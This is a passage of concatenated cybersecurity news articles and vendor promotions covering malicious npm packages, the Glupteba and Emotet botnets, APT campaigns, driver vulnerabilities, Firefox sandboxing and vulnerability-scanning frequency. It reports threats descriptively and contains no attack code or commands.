Service (DDoS) attacks. According to the statistics, the volume of Distributed Denial of Service (DDoS) attacks increases around the holidays.\nIn addition, since the beginning of the global pandemic in 2020, online shopping and retail have increased dramatically as more individuals prefer online shopping.\nAttackers know the damage caused by DDoS attacks now is more costly to businesses, especially around the lucrative holiday season.\nAccording to current forecasts, DDoS attacks will reach a record 11 million by the end of 2021. Knowing this, organizations must design their network mitigations and server technologies with the ability to withstand more significant DDoS attacks.\n5 - Breached passwords\nOne of the most common ways attackers attempt to compromise environments is using compromised credentials. Obtaining compromised credentials is an easy, minimal effort attack vector that can lead to tremendous damage to business-critical data. \nAs mentioned, employees are more distracted and prove to be easier targets around the holidays. Phishing emails, aside from launching a ransomware attack, can be used to harvest legitimate credentials. A growing business on the dark web is Initial Access Brokers. The Initial Access Broker provides criminals with legitimate and verified user accounts for a price. It allows attackers to purchase credentials on the dark web, so the hard work of getting access to the environment is already complete. \nAccording to the IBM Cost of a Data Breach Report 2021, compromised credentials were the most common initial attack vector, accounting for 20% of breaches. In addition, compromised credentials are among the costliest and lead to a longer data breach lifecycle than other types of data breaches as they are more challenging to detect. To combat this threat, organizations must bolster their password policies and implement adequate breached password protection.\nBolster password policy and stop breached accounts\nIncreasing the security of Active Directory passwords and implementing breached password protection are critical to bolstering cybersecurity posture during the holidays. Unfortunately, native Active Directory password policies lack modern features to protect user accounts from weak passwords, incremental passwords, and significantly breached passwords. \nSpecops Password Policy helps to overcome these challenges. Note the following features.\nIt protects against the use of weak Active Directory passwordsIt protects against the use of incremental passwordsIt can implement length-based agingIt provides continuous breached password protectionSpecops monitor brute force attempts on dangerous ports, such as RDP, for the LIVE password’s attackers are usingIt helps to defend your organization against credential-based ransomware attacks by alerting businesses to passwords in use found in breached password lists\nSpecops Breached Password Protection\nIn addition, Specops Password Policy provides the following benefits:\nEasy implementation of multiple password dictionary lists Over 2 billion breached passwords and growingLIVE breached password account dataFind and remove breached passwords in your Active Directory environmentInformative client messagingReal-time, dynamic feedback to end-users at password changeCustomize password expiration based on password lengthBlock common information from use in passwords, including usernames, display names, specific words, consecutive characters, incremental passwords, and reusing a part of the current passwordGranular, GPO-driven targeting for any GPO level, computer, user, or group populationPassphrase supportSupports over 25 languagesUse Regular Expressions to customize password filtering further\nLearn more about the password protection provided by Specops Password Policy and start a free trial. \n\n\nFound this article interesting?

'text': 'At least 17 malware-laced packages have been discovered on the NPM package Registry, adding to a recent barrage of malicious software hosted and delivered through open-source software repositories such as PyPi and RubyGems.\nDevOps firm JFrog said the libraries, now taken down, were designed to grab Discord access tokens and environment variables from users’ computers as well as gain full control over a victim’s system.\n\n“The packages’ payloads are varied, ranging from infostealers up to full remote access backdoors,“ researchers Andrey Polkovnychenko and Shachar Menashe said in a report published Wednesday. “Additionally, the packages have different infection tactics, including typosquatting, dependency confusion and trojan functionality.“\nThe list of packages is below -\nprerequests-xcode (version 1.0.4)discord-selfbot-v14 (version 12.0.3)discord-lofy (version 11.5.1)discordsystem (version 11.5.1)discord-vilao (version 1.0.0)fix-error (version 1.0.0)wafer-bind (version 1.1.2)wafer-autocomplete (version 1.25.0)wafer-beacon (version 1.3.3)wafer-caas (version 1.14.20)wafer-toggle (version 1.15.4)wafer-geolocation (version 1.2.10)wafer-image (version 1.2.2)wafer-form (version 1.30.1)wafer-lightbox (version 1.5.4)octavius-public (version 1.836.609)mrg-message-broker (version 9998.987.376)\nAs prior research has established, collaboration and communication tools like Discord and Slack have become handy mechanisms for cybercriminals, with Discord servers integrated into the attack chains for remotely controlling the infected machines and even to exfiltrate data from the victims.\n\n“Cyber criminals are using Discord CDN to host malicious files as well as for command-and-control (C&C) communication,“ cybersecurity firm Zscaler noted in an analysis earlier this February. “Due to the static content distribution service, it is highly popular among threat actors to host malicious attachments that remain publicly accessible even after removing actual files from Discord.“\n\nIn light of these disclosures, it’s no surprise that the theft of Discord access tokens could enable threat actors to use the platform as a covert data exfiltration channel, distribute malware to other Discord users, and even sell Discord Nitro premium accounts to other third-parties, who can then use them for their own campaigns.\nEven more troublingly, the package “prerequests-xcode“ functioned as a full-fledged remote access trojan, a Node.JS port of DiscordRAT, that’s equipped to capture screenshots, gather clipboard data, execute arbitrary VBScript and PowerShell code, steal passwords, and download malicious files, effectively granting the adversary the ability to take over the developer’s system.\nIf anything, the development adds to an increasingly “disturbing trend“ of using rogue packages as a stealthy compromise vector to facilitate an array of malicious activities, including supply-chain attacks.\n“Public repositories have become a handy instrument for malware distribution: the repository’s server is a trusted resource, and communication with it does not raise the suspicion of any antivirus or firewall,“ the researchers said. “In addition, the ease of installation via automation tools such as the NPM client, provides a ripe attack vector.“\n\n\nFound this article interesting?

{'title': 'Google Disrupts Blockchain-based Glupteba Botnet; Sues Russian Hackers',
'text': 'Google on Tuesday said it took steps to disrupt the operations of a sophisticated “multi-component“ botnet called Glupteba that approximately infected more than one million Windows computers across the globe and stored its command-and-control server addresses on Bitcoin’s blockchain as a resilience mechanism.\nAs part of the efforts, Google’s Threat Analysis Group (TAG) said it partnered with the CyberCrime Investigation Group over the past year to terminate around 63 million Google Docs that were observed to have distributed the malware, alongside 1,183 Google Accounts, 908 Cloud Projects, and 870 Google Ads accounts that were associated with its distribution.\nGoogle TAG further said it worked with internet infrastructure providers and hosting providers, such as CloudFlare, to dismantle the malware by taking down servers and placing interstitial warning pages in front of the malicious domains.\nIn tandem, the internet giant also announced a lawsuit against two Russian individuals, Dmitry Starovikov and Alexander Filippov, who are alleged to be responsible for managing the botnet alongside 15 unnamed defendants, calling the enterprise a “modern technological and borderless incarnation of organized crime.“\n\n“Glupteba is known to steal user credentials and cookies, mine cryptocurrencies on infected hosts, deploy and operate proxy components targeting Windows systems and IoT devices,“ TAG researchers Shane Huntley and Luca Nagy said, with the botnet observed targeting victims worldwide, including the U.S., India, Brazil, and Southeast Asia.\nGlupteba was first publicly documented by Slovak internet security company ESET in 2011. Last year, cybersecurity firm Sophos published a report on the dropper, noting it “was able to continuously thwart efforts at removing it from an infected machine,“ adding “Glupteba also takes a variety of approaches to lay low and avoid being noticed.“\n\nPrimarily disseminated through sketchy third-party software and online movie streaming sites, the modular botnet camouflages as free software and YouTube videos that, post-installation, can be orchestrated to take advantage of its illicit access to the devices to retrieve additional components and further a number of criminal schemes, including —\nStealing personal account information and selling the access to third-parties on a portal called “Dont[.]farm“Vending credit cards to facilitate fraudulent purchases from Google Ads and other Google servicesSelling unauthorized access to the devices for use as residential proxies via “AWMProxy[.]net“ to conceal the activities of bad actorsServing disruptive pop-up ads on the compromised machines, andHijacking the computing power of the devices to mine cryptocurrency\nBut in an interesting twist, rather than selling those stolen credentials directly to other criminal customers, the Glupteba operators pawned the access through virtual machines that were preloaded with those accounts by logging in using the siphoned usernames and passwords on a web browser.\n“Dont[.]farm’s customers pay the Glupteba Enterprise in exchange for the ability to access a browser that is already logged into a victim’s stolen Google account,“ the company alleged. “Once granted access to the account, the Dont[.]farm customer has free rein to use that account however they desire, including buying advertisements and launching fraudulent ad campaigns, all without the true account owner’s knowledge or authorization.“\n\nThe downloaded modules, besides incorporating measures to keep it invisible to detection by antivirus solutions, are designed to execute arbitrary commands pushed by an attacker-controlled server. Glupteba is also notable for the fact that unlike other traditional botnets, the malware leverages the Bitcoin blockchain as a backup command-and-control (C2) system.\nSpecifically, instead of relying solely on a list of predetermined and disposable domains either hard-coded in the malware or obtained using a domain generation algorithm (DGA), the malware is programmed to search the public Bitcoin blockchain for transactions involving three wallet addresses owned by the threat actor so as to fetch the encrypted C2 server address.\n“Unfortunately, Glupteba’s use of blockchain technology as a resiliency mechanism is notable here and is becoming a more common practice among cyber crime organizations,“ Google’s Royal Hansen and Halimah DeLaine Prado said. “The decentralized nature of blockchain allows the botnet to recover more quickly from disruptions, making them that much harder to shutdown.“\nWhat’s more, the tech giant explained in its lawsuit that the cybercriminal gang maintained an online presence at “Voltronwork[.]com“ to actively recruit developers by means of job openings on Google Ads to “support its websites, transactions, and overall operation.“\nThe legal move also comes a day after Microsoft disclosed it had seized 42 domains used by the China-based Nickel hacking group (aka APT15, Bronze Palace, Ke3Chang, Mirage, Playful Dragon, and Vixen Panda) to target servers belonging to government agencies, think tanks, and human rights organizations in the U.S. and 28 other countries worldwide.\n\n\nFound this article interesting?

{'title': '140,000 Reasons Why Emotet is Piggybacking on TrickBot in its Return from the Dead',
'text': 'The operators of TrickBot malware have infected an estimated 140,000 victims across 149 countries a little over a year after attempts were to dismantle its infrastructure, even as the advanced Trojan is fast becoming an entry point for Emotet, another botnet that was taken down at the start of 2021.\nMost of the victims detected since November 1, 2020, are from Portugal (18%), the U.S. (14%), and India (5%), followed by Brazil (4%), Turkey (3%), Russia (3%), and China (3%), Check Point Research noted in a report shared with The Hacker News, with government, finance, and manufacturing entities emerging the top affected industry verticals.\n“Emotet is a strong indicator of future ransomware attacks, as the malware provides ransomware gangs a backdoor into compromised machines,“ said the researchers, who detected 223 different Trickbot campaigns over the course of the last six months.\nBoth TrickBot and Emotet are botnets, which are a network of internet-connected devices infected by malware and can be tasked to conduct an array of malicious activities. TrickBot originated as a C++ banking Trojan and as a successor of Dyre malware in 2016, featuring capabilities to steal financial details, account credentials and other sensitive information; laterally spread across a network; and drop additional payloads, including Conti, Diavol, and Ryuk ransomware strains.\n\nDisseminated via malspam campaigns or previously dropped by other malware like Emotet, TrickBot is believed to be the handiwork of a Russia-based group called Wizard Spider and has since extended its capabilities to create a complete modular malware ecosystem, making it an adaptable and evolving threat, not to mention an attractive tool for conducting a myriad of illegal cyber activities. \n\nThe botnet also caught the attention of government and private entities late last year, when the U.S. Cyber Command and a group of private sector partners spearheaded by Microsoft, ESET, and Symantec acted to blunt TrickBot’s reach and prevent the adversary from purchasing or leasing servers for command-and-control operations.\nEmotet comes back with new tricks\nBut these actions have only been temporary setbacks, with the malware authors rolling out updates to the botnet code that have made it more resilient and suitable for mounting further attacks. What’s more, TrickBot infections in November and December have also propelled a surge in Emotet malware on compromised machines, signaling a revival of the infamous botnet after a gap of 10 months following a coordinated law enforcement effort to disrupt its spread.\nIntel 471 in an independent analysis of the new Emotet samples said it discovered “distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol,“ adding “Further investigation into Emotet’s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.“\n“Emotet could not choose a better platform than Trickbot as a delivery service when it came to its rebirth,“ the researchers noted.\n\nThe latest wave of spam attacks prompts users to download password-protected ZIP archive files, which contain malicious documents that, once opened and macros are enabled, result in the deployment of Emotet malware, thereby enabling it to rebuild its botnet network and grow in volume.\n“Emotet’s comeback is a major warning sign for yet another surge in ransomware attacks as we go into 2022,“ said Lotem Finkelstein, Check Point’s head of threat intelligence. “Trickbot, who has always collaborated with Emotet, is facilitating Emotet’s comeback by dropping it on infected victims. This has allowed Emotet to start from a very firm position, and not from scratch.“\nThat’s not all. In what appears to be a further escalation in tactics, new Emotet artifacts have been uncovered dropping Cobalt Strike beacons directly onto compromised systems, according to Cryptolaemus cybersecurity experts, as opposed to dropping intermediate payloads before installing the post-exploitation tool.\n“This is a big deal. Typically Emotet dropped TrickBot or QakBot, which in turn dropped Cobalt Strike. You’d usually have about a month between [the] first infection and ransomware. With Emotet dropping [Cobalt Strike] directly, there’s likely to be a much much shorter delay,“ security researcher Marcus Hutchins tweeted.\n\n\nFound this article interesting?

{'title': '[eBook] Guide to Achieving 24x7 Threat Monitoring and Response for Lean IT Security Teams',
'text': 'If there is one thing the past few years have taught the world, it’s that cybercrime never sleeps. For organizations of any size and scope, having around-the-clock protection for their endpoints, networks, and servers is no longer optional, but it’s also not entirely feasible for many. Attackers are better than ever at slipping in undetected, and threats are constantly evolving. \nTeams can’t afford to take a minute off, but they also can’t manage the massive security necessary to defend most organizations. A new eBook by XDR provider Cynet (download here) breaks down this challenge and offers some solutions for lean security teams looking for ways to improve their detection and response capabilities. \nThe guide strikes an optimistic tone for lean IT security teams.\nThough the challenges are expansive – including talent shortages, an ever-expanding threat surface, and rising security tool prices – organizations can still find smart and effective ways to stay protected 24x7.\nWhy 24x7 monitoring is more crucial than ever \nCyber attackers today rarely adhere to normal working hours. Indeed, they’re more apt to stick to the “off hours” for most organizations when defenses are low, and the guard posts are likeliest to be unmanned. For instance, some research suggests that nearly 76% of ransomware infections studied occurred outside of normal working hours. Nearly half of those occurred at night, and a quarter happened on weekends. \nThe problem requires constant monitoring to resolve, but that’s easier said than done. Cyber security is in the midst of a sharp skills shortage, with some estimating as nearly as 4 million unfilled cyber security positions in 2021. The question is how organizations can overcome this gap to fill these needed holes.\nThe two pillars of 24x7 monitoring\nAchieving 24x7 monitoring and response requires two key pillars, according to the eBook: automation and outsourcing. The first of these should be obvious. Automated systems can detect smaller, more subtle cues in software behavior, and they can do so faster. \nDigging a little deeper, however, you can see the real impact of automation. One study shows that organizations that use fully deployed security automation spend as much as $1.5 million less on data breaches than their counterparts. More importantly, today’s tools are finally starting to tap into the potential for cybersecurity automation. \nThis includes the ability to scan exponentially more data and logs, scanning multiple endpoints and devices in seconds, and piecing together the landscape into a picture that makes sense. However, even the best-automated tools are incomplete when teams have to do significant work to manage them. New tools like XDR simplify the process by putting more security tools into a single pane of glass. \nEven so, skills are necessary to manage these tools, and this is where outsourcing comes in. While recruiting an in-house team is always ideal, for many lean IT security teams, outsourcing offers an equally effective and reliable solution. However, it’s all about finding the right vendor and ensuring their offerings match an organization’s need. \nThe eBook dives deeper into these concepts and more.

'text': 'Network-attached storage (NAS) appliance maker QNAP on Tuesday released a new advisory warning of a cryptocurrency mining malware targeting its devices, urging customers to take preventive steps with immediate effect.\n“A bitcoin miner has been reported to target QNAP NAS. Once a NAS is infected, CPU usage becomes unusually high where a process named ’[oom_reaper]’ could occupy around 50% of the total CPU usage,“ the Taiwanese company said in an alert. “This process mimics a kernel process but its [process identifier] is usually greater than 1000.“\n\nQNAP said it’s currently investigating the infections, but did not share more information on the initial access vector that’s being used to compromise the NAS devices. Affected users can remove the malware by restarting the appliances.\nIn the interim, the company is recommending that users update their QTS (and QuTS Hero) operating systems to the latest version, enforce strong passwords for administrator and other user accounts, and refrain from exposing the NAS devices to the internet.\nQNAP NAS devices have long been a lucrative target for a number of malicious campaigns in recent years.\nIn July 2020, cybersecurity agencies in the U.S. and U.K. issued a joint bulletin about a threat that infected the NAS devices with a data-stealing malware dubbed QSnatch (or Derek). In December 2020, the device maker warned of two high-severity cross-site scripting flaws (CVE-2020-2495 and CVE-2020-2496) that enabled remote adversaries to take over the devices.\n\nThen in March 2021, Qihoo 360’s Network Security Research Lab disclosed a cryptocurrency campaign that exploited two security flaws in the firmware — CVE-2020-2506 and CVE-2020-2507 — to gain root privileges and deploy a miner called UnityMiner on compromised devices.

{'title': 'Eltima SDK Contain Multiple Vulnerabilities Affecting Several Cloud Service Provides',
'text': 'Cybersecurity researchers have disclosed multiple vulnerabilities in a third-party driver software developed by Eltima that have been “unwittingly inherited“ by cloud desktop solutions like Amazon Workspaces, Accops, and NoMachine and could provide attackers a path to perform an array of malicious activities.\n“These vulnerabilities allow attackers to escalate privileges enabling them to disable security products, overwrite system components, corrupt the operating system, or perform malicious operations unimpeded,“ SentinelOne Senior Security Researcher, Kasif Dekel, said in a report shared with The Hacker News.\nThe 27 flaws have since been addressed in Amazon Nimble Studio AMI, Amazon NICE DCV, Amazon WorkSpaces, Amazon AppStream, NoMachine, Accops HyWorks, Accops HyWorks DVM Tools, Eltima USB Network Gate, Amzetta zPortal Windows zClient, Amzetta zPortal DVM Tools, FlexiHub, and Donglify.\n\nAt its core, the issues reside in a product developed by Eltima that offers “USB over Ethernet“ capabilities, and enables desktop virtualization services like Amazon WorkSpaces to redirect connected USB devices such as webcams to their remote desktop.\nSpecifically, the vulnerabilities can be traced back to two drivers that are responsible for USB redirection — “wspvuhub.sys“ and “wspusbfilter.sys“ — leading to a buffer overflow scenario that could result in the execution of arbitrary code with kernel-mode privileges.\nBSoD Proof Of Concept\n“An attacker with access to an organization’s network may also gain access to execute code on unpatched systems and use this vulnerability to gain local elevation of privilege,“ the cybersecurity firm noted. “Attackers can then leverage other techniques to pivot to the broader network, like lateral movement.“\nWhile there’s no evidence that threat actors have exploited these vulnerabilities, it’s recommended, out of an abundance of caution, to revoke any privileged credentials deployed to the affected platforms prior to applying the patches and check access logs for any signs of irregularities.\nThe discovery marks the fourth set of security vulnerabilities affecting software drivers that have been uncovered by SentinelOne since the start of the year.\n\nEarlier this May, the Mountain View-based company disclosed a number of privilege escalation vulnerabilities in Dell’s firmware update driver named “dbutil_2_3.sys“ that went undisclosed for more than 12 years. Then in July, it also made public a high-severity buffer overflow flaw impacting “ssport.sys“ and used in HP, Xerox, and Samsung printers that were found to have remained undetected since 2005.\nAnd in September, SentinelOne made public a high-severity flaw in the HP OMEN driver software “HpPortIox64.sys“ that could allow threat actors to elevate privileges to kernel mode without requiring administrator permissions, allowing them to disable security products, overwrite system components, and even corrupt the operating system.\n“Vulnerabilities in third-party code have the potential to put huge numbers of products, systems, and ultimately, end users at risk,“ Dekel said. “The outsized effect of vulnerable dependency code is magnified even further when it appears in services offered by cloud providers.“\n\n\nFound this article interesting?

'text': 'Nobelium, the threat actor attributed to the massive SolarWinds supply chain compromise, has been once again linked to a series of attacks targeting multiple cloud solution providers, services, and reseller companies, as the hacking group continues to refine and retool its tactics at an alarming pace in response to public disclosures.\nThe intrusions, which are being tracked by Mandiant under two different activity clusters UNC3004 and UNC2652, are both associated with UNC2452, an uncategorized threat group that has since been tied to the Russian intelligence service. UNC2652, in particular, has been observed targeting diplomatic entities with phishing emails containing HTML attachments with malicious JavaScript, ultimately dropping a Cobalt Strike Beacon onto the infected devices.\n“In most instances, post compromise activity included theft of data relevant to Russian interests,“ Mandiant researchers Luke Jenkins, Sarah Hawley, Parnian Najafi, and Doug Bienstock said in a new report. “In some instances, the data theft appears to be obtained primarily to create new routes to access other victim environments.“\n\nThe revelations come exactly a year after details emerged of a Kremlin-backed hacking campaign that breached the servers of network management provider SolarWinds to distribute tainted software binaries to a number of high-profile customers, including nine U.S. federal agencies.\nIf anything, the development is yet another indication of the threat actor’s capacity to continually “innovate and identify new techniques and tradecraft to maintain persistent access to victim environments, hinder detection, and confuse attribution efforts,“ while also highlighting the “effectiveness of leveraging third parties and trusted vendor relationships to carry out nefarious operations.“\nMicrosoft had previously dubbed Nobelium as “skillful and methodic operators who follow operations security (OpSec) best practices.“\nEver since the SolarWinds incident came to light, the APT group has been connected to a string of attacks aimed at think tanks, businesses, and government entities around the globe, even as an ever-expanding malware toolbox has been put to use with the goal of establishing a foothold in the attacked system and downloading other malicious components.\nIn late October 2021, Microsoft took the wraps off an intrusion campaign that compromised as many as 14 downstream customers of multiple cloud service providers (CSP), managed service providers (MSP), and other IT services organizations. The poisoning attacks worked by breaking into the service providers, subsequently using the privileged access and credentials belonging to these providers to strike a wide range of organizations that relied on the CSPs.\nTop-notch operational security and advanced tradecraft\nSome of the other techniques incorporated by the group into its playbook involve the use of credentials potentially obtained from an info-stealer malware campaign staged by a third-party actor to gain initial access to organizations, an attack sequence that resulted in the victims’ workstations infected with CryptBot malware after browsing to low reputation websites offering cracked software, corroborating a similar report from Red Canary published last week.\nAlso employed by Nobelium is a new tool dubbed Ceeloader, a bespoke downloader that’s designed to decrypt a shellcode payload to execute in memory on the compromised system, as well as the abuse of push notifications on smartphones to circumvent multi-factor authentication (MFA) protections.\n“In these cases, the threat actor had a valid username and password combination,“ the researcher said. “Many MFA providers allow for users to accept a phone app push notification or to receive a phone call and press a key as a second factor. The threat actor took advantage of this and issued multiple MFA requests to the end user’s legitimate device until the user accepted the authentication, allowing the threat actor to eventually gain access to the account.“\n\nOther tactics of note include —\nCompromising multiple accounts within an environment and using each of those accounts for different functions to limit exposure,Using a combination of Tor, Virtual Private Servers (VPS) and public Virtual Private Networks (VPN) to access victim environments,Hosting second-stage payloads as encrypted blobs on legitimate websites running WordPress, andUsing residential IP address ranges to authenticate to victim environments.\n“This intrusion activity reflects a well-resourced threat actor set operating with a high level of concern for operational security,“ the researchers said. “The abuse of a third party, in this case a CSP, can facilitate access to a wide scope of potential victims through a single compromise.“\n\n\nFound this article interesting?

'text': 'Microsoft on Monday announced the seizure of 42 domains used by a China-based cyber espionage group that set its sights on organizations in the U.S. and 28 other countries pursuant to a legal warrant issued by a federal court in the U.S. state of Virginia.\nThe Redmond company attributed the malicious activities to a group it pursues as Nickel, and by the wider cybersecurity industry under the monikers APT15, Bronze Palace, Ke3Chang, Mirage, Playful Dragon, and Vixen Panda. The advanced persistent threat (APT) actor is believed to have been active since at least 2012.\n“Nickel has targeted organizations in both the private and public sectors, including diplomatic organizations and ministries of foreign affairs in North America, Central America, South America, the Caribbean, Europe and Africa,“ Microsoft’s Corporate Vice President for Customer Security and Trust, Tom Burt, said. “There is often a correlation between Nickel’s targets and China’s geopolitical interests.“\n\nThe rogue infrastructure enabled the hacking crew to maintain long-term access to the compromised machines and execute attacks for intelligence gathering purposes targeting unnamed government agencies, think tanks, and human rights organizations as part of a digital espionage campaign dating back to September 2019.\nMicrosoft painted the cyber assaults as “highly sophisticated“ that used a multitude of techniques, including breaching remote access services and exploiting vulnerabilities in unpatched VPN appliances as well as Exchange Server and SharePoint systems to “insert hard-to-detect malware that facilitates intrusion, surveillance and data theft.“\n\nUpon gaining an initial foothold, Nickel has been found deploying credential dumping tools and stealers such as Mimikatz and WDigest to hack into victim accounts, followed by delivering custom malware that allowed the actor to maintain persistence on victim networks over extended periods of time and conduct regularly scheduled exfiltration of files, execute arbitrary shellcode, and collect emails from Microsoft 365 accounts using compromised credentials.\nThe multiple backdoor families used for command and control are being tracked as Neoichor, Leeson, NumbIdea, NullItch, and Rokum.\n\nThe latest wave of attacks adds to an extensive list of surveillanceware campaigns mounted by the APT15 group in recent years. In July 2020, mobile security firm Lookout disclosed four trojanized legitimate apps — named SilkBean, DoubleAgent, CarbonSteal, and GoldenEagle — that targeted the Uyghur ethnic minority and the Tibetan community with the goal of gathering and transmitting personal user data to adversary-operated command-and-control servers.\n“As China’s influence around the world continues to grow and the nation establishes bilateral relations with more countries and extends partnerships in support of China’s Belt and Road Initiative, we assess that China-based threat actors will continue to target customers in government, diplomatic, and NGO sectors to gain new insights, likely in pursuit of economic espionage or traditional intelligence collection objectives,“ Microsoft said.\n\n\nFound this article interesting?

{'title': 'Latest Firefox 95 Includes RLBox Sandboxing to Protect Browser from Malicious Code',
'text': 'Mozilla is beginning to roll out Firefox 95 with a new sandboxing technology called RLBox that prevents untrusted code and other security vulnerabilities from causing “accidental defects as well as supply-chain attacks.“\nDubbed “RLBox“ and implemented in collaboration with researchers at the University of California San Diego and the University of Texas, the improved protection mechanism is designed to harden the web browser against potential weaknesses in off-the-shelf libraries used to render audio, video, fonts, images, and other content.\n\nTo that end, Mozilla is incorporating “fine-grained sandboxing“ into five modules, including its Graphite font rendering engine, Hunspell spell checker, Ogg multimedia container format, Expat XML parser, and Woff2 web font compression format.\nThe framework uses WebAssembly, an open standard that defines a portable binary-code format for executable programs that can be run on modern web browsers, to isolate potentially unsafe code, a prototype version of which was shipped in February 2020 to Mac and Linux users.\nAll major browsers are designed to run web content in their own sandboxed environment as a means to counter malicious sites from exploiting a browser vulnerability to compromise the underlying operating system. Firefox also implements Site Isolation, which loads each website separately in its own process and, as a result, blocks arbitrary code hosted on a rogue website from accessing confidential information stored in other sites.\nThe problem with these approaches, according to Mozilla, is that attacks often work by stringing together two or more flaws that aim to breach the sandboxed process containing the suspicious site and break out of the isolation barriers, effectively undermining the security measures put in place.\n“Retrofitting isolation can be labor-intensive, very prone to security bugs, and requires critical attention to performance,“ the researchers noted in a paper that formed the basis for the feature. RLBox “minimizes the burden of converting Firefox to securely and efficiently use untrusted code.“\n\nRLBox aims to increase browser security by sandboxing third-party C/C++-language libraries that are vulnerable to attacks from interfering with other browser processes and limit potential damage. Put differently, the goal is to isolate the libraries in lightweight sandboxes such that threat actors can’t exploit vulnerabilities in these subcomponents to impact the rest of the browser.\n“Rather than hoisting the code into a separate process, we instead compile it into WebAssembly and then compile that WebAssembly into native code,“ Mozilla’s principal engineer Bobby Holley said. “The transformation places two key restrictions on the target code: it can’t jump to unexpected parts of the rest of the program, and it can’t access memory outside of a specified region,“ adding “even a zero-day vulnerability in any of [these libraries] should pose no threat to Firefox.“\nMozilla noted that cross-platform sandboxing for Graphite, Hunspell, and Ogg is shipping in Firefox 95 across desktop and mobile versions of the browser, while Expat and Woff2 are expected to gain support for the feature in Firefox 96.\n\n\nFound this article interesting?

'text': 'Users looking to activate Windows without using a digital license or a product key are being targeted by tainted installers to deploy malware designed to plunder credentials and other information in cryptocurrency wallets.\nThe malware, dubbed “CryptBot,“ is an information stealer capable of obtaining credentials for browsers, cryptocurrency wallets, browser cookies, credit cards, and capturing screenshots from the infected systems. Deployed via cracked software, the latest attack involves the malware masquerading as KMSPico.\n\nKMSPico is an unofficial tool that’s used to illicitly activate the full features of pirated copies of software such as Microsoft Windows and Office suite without actually owning a license key.\n\n“The user becomes infected by clicking one of the malicious links and downloading either KMSPico, Cryptbot, or another malware without KMSPico,“ Red Canary researcher Tony Lambert said in a report published last week. “The adversaries install KMSPico also, because that is what the victim expects to happen, while simultaneously deploying Cryptbot behind the scenes.“\n\nThe American cybersecurity firm said it also observed several IT departments using the illegitimate software instead of valid Microsoft licenses to activate systems, adding the altered KMSpico installers are distributed via a number of websites that claim to be offering the “official“ version of the activator.\nThis is far from the first time cracked software has emerged as a conduit for deploying malware. In June 2021, Czech cybersecurity software company Avast disclosed a campaign dubbed “Crackonosh“ that involved distributing illegal copies of popular software to break into and abuse the compromised machines to mine cryptocurrency, netting the attacker over $2 million in profits.\n\n\nFound this article interesting?

{'title': 'Vulnerability Scanning Frequency Best Practices',
'text': 'So you’ve decided to set up a vulnerability scanning programme, great. That’s one of the best ways to avoid data breaches. How often you should run your scans, though, isn’t such a simple question. The answers aren’t the same for every type of organization or every type of system you’re scanning.\nThis guide will help you understand the questions you should be asking and help you come up with the answers that are right for you.\nHow often should vulnerability scans be run\nA lot of the advice below depends on what exactly you’re scanning. If you’re not sure about that yet - check out this comprehensive vulnerability scanning guide.\nOnce you’ve decided which systems should be in scope, and what type of scanner you need, you’re ready to start scanning. So how often should you ideally be running vulnerability scans?\nHere are five strategies to consider, and we’ll discuss in which scenarios they work best:\nChange-basedHygiene-basedCompliance-basedResource-basedEmerging threat-based\nChange-based\nFast-moving tech companies often deploy code or infrastructure changes multiple times a day, while other organizations can have a relatively static setup, and may not be making regular changes to any of their systems. \nThe complexity of technology we use means that each change can bring with it a catastrophic configuration mistake, or the accidental introduction of a component with known vulnerabilities. For this reason, running a vulnerability scan after even minor changes are applied to your systems is a sensible approach.\nBecause it’s based on changes, this approach is most suited for rapidly changing assets, like web applications, or cloud infrastructure like AWS, Azure and GCP, where new assets can be deployed and destroyed on a minute-by-minute basis. It’s also particularly worth doing in cases where these systems are exposed to the public internet.\nFor this reason, many companies choose to integrate testing tools into their deployment pipelines automatically via an API with their chosen scanning tool.\nIt’s also worth considering how complex the change you’re making is.\nWhile automated tools are great for regular testing, the bigger or more dramatic the change you’re making, the more you may want to consider getting a penetration test to double-check no issues have been introduced.\nGood examples of this might be making big structural changes to the architecture of web applications, any sweeping authentication or authorization changes, or large new features introducing lots of complexity. On the infrastructure side the equivalent might be a big migration to the cloud, or moving from one cloud provider to another.\nHygiene-based\nEven if you don’t make regular changes to your systems, there is still an incredibly important reason to scan your systems on a regular basis, and one that is often overlooked by organizations new to vulnerability scanning.\nSecurity researchers regularly find new vulnerabilities in the software of all kinds and public exploit code which makes exploiting them a breeze can be publicly disclosed at any time. This is what has been the cause of some of the most impactful hacks in recent history, from the Equifax breach to the Wannacry ransomware, both were caused by new flaws being uncovered in common software, and criminals rapidly weaponizing exploits to their own ends.\nNo software is exempt from this rule of thumb. Whether it’s your web server, operating systems, a particular development framework you use, your remote-working VPN, or firewall. The end result is that even if you had a scan yesterday that said you were secure, that’s not necessarily going to be true tomorrow.\nNew vulnerabilities are discovered every day, so even if no changes are deployed to your systems, they could become vulnerable overnight.\nDoes that mean that you should simply be running vulnerability scans non-stop though? Not necessarily, as that could generate problems from excess traffic, or mask any problems occurring.\nFor a yardstick, the notorious WannaCry cyber-attack shows us that timelines in such situations are tight, and organizations that don’t react in reasonable time to both discover and remediate their security issues put themselves at risk. Microsoft released a patch for the vulnerability WannaCry used to spread just 59 days before the attacks took place. What’s more, attackers were able to produce an exploit and start compromising machines only 28 days after a public exploit was leaked.\nLooking at the timelines in this case alone, it’s clear that by not running vulnerability scans and fixing issues within a 30-60 day window is taking a big risk, and don’t forget that even after you’ve discovered the issue, it may take some time to fix.\nOur recommendation for good cyber hygiene for most businesses, is to use a vulnerability scanner on your external facing infrastructure on at least a monthly basis, to allow you to keep one step ahead of these nasty surprises. For organizations with a heightened sensitivity to cyber security, weekly or even daily scans may make more sense. Similarly, internal infrastructure scans once a month helps maintain good cyber hygiene.\nFor web applications, scanning their framework and infrastructure components on a regular basis makes equal sense, but if you’re looking for mistakes in your own code with authenticated scans, a change-based approach makes much more sense.\nCompliance-based\nIf you’re running vulnerability scans for compliance reasons, then specific regulations often explicitly state how often vulnerability scans should be performed. For instance, PCI DSS requires that quarterly external scans are performed on the systems in its scope.\nHowever, you should think carefully about your scanning strategy, as regulatory rules are meant as a one-size-fits-all guideline that may not be appropriate for your business.\nSimply comparing this 90-day regulation with the timelines seen in the WannaCry example above shows us that such guidelines don’t always cut the mustard. If you actually want to stay secure rather than simply ticking a box, often it makes sense to go above and beyond these regulations, in the ways described above.\nResource-based\nVulnerability scanners can produce a vast amount of information, and reveal a lot of flaws, some of which will be bigger risks than others. When considering the amount of information that needs processing, and the amount of work that needs to take place to rectify these flaws, it can be tempting to think 